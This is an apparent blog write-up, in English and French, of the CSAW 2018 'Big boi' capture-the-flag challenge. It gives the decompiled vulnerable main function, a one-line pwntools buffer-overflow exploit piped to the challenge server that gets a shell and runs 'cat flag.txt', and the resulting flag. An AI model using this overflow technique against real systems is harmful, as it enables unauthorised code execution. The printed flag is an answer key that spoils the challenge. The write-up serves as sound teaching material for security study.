---
author: "Laluka"
title: "CSAW - Big boi"
slug: "big_boi"
date: 2018-09-16
description: "Binary exploitation of a dummy command executor, simple buffer overflow of a function's parameters. "
---


### Description

> Only big boi pwners will get this one!

> nc pwn.chal.csaw.io 9000

You can download the ELF [here](/hacking/big_boi/big_boi)


### TL;DR

This challenge is a simple buffer overflow with a check that `may` lead to
code execution. It's an easy pwn, so one liner is the way to go !


### Methology

Step 1 : Use IDA to decompile the program and avoid losing time, then overflow it with the good value many time to access the "/bin/bash" statement.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf; // [rsp+10h] [rbp-30h]
  __int64 v5; // [rsp+18h] [rbp-28h]
  __int64 v6; // [rsp+20h] [rbp-20h]
  int v7; // [rsp+28h] [rbp-18h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  buf = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0;
  HIDWORD(v6) = -559038737;
  puts("Are you a big boiiiii??");
  read(0, &buf, 0x18uLL);
  if ( HIDWORD(v6) == 0xCAF3BAEE )
    run_cmd("/bin/bash", &buf);
  else
    run_cmd("/bin/date", &buf);
  return 0;
}
```

Step 2 : Print the cmd you want to run.

```bash
python2 -c 'from pwn import *; print p32(0xCAF3BAEE) * 6; print "cat flag.txt"' | nc pwn.chal.csaw.io 9000
```

Step 3 : Enjoy your free points ! Yayyyy ! \o/

The flag is : __flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}__


<h2 id="fr">French version</h2>


### Description

> Seuls les big boi pwners passeront celui-là !

> nc pwn.chal.csaw.io 9000

Vous pouvez télécharger le fichier ELF [ici](/hacking/big_boi/big_boi)


### TL;DR

Ce challenge est un simple buffer overflow avec une comparaison qui `peut` conduire à une exécution de code. C'est un pwn facile, donc le one-liner est de mise !


### Methologie

Etape 1 : Utilisez IDA pour décompiler le programme et éviter de perdre du temps, puis overflow au bon endroit avec la bonne valeur répétée pour accéder au code executant "/bin/bash".

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf; // [rsp+10h] [rbp-30h]
  __int64 v5; // [rsp+18h] [rbp-28h]
  __int64 v6; // [rsp+20h] [rbp-20h]
  int v7; // [rsp+28h] [rbp-18h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  buf = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0;
  HIDWORD(v6) = -559038737;
  puts("Are you a big boiiiii??");
  read(0, &buf, 0x18uLL);
  if ( HIDWORD(v6) == 0xCAF3BAEE )
    run_cmd("/bin/bash", &buf);
  else
    run_cmd("/bin/date", &buf);
  return 0;
}
```

Etape 2 : Envoyer l'overflow et la cmd à exécuter.

```bash
python2 -c 'from pwn import *; print p32(0xCAF3BAEE) * 6; print "cat flag.txt"' | nc pwn.chal.csaw.io 9000
```

Etape 3 : Profiter des points gratuits ! Yayyyy ! \o/

Le flag est : __flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}__
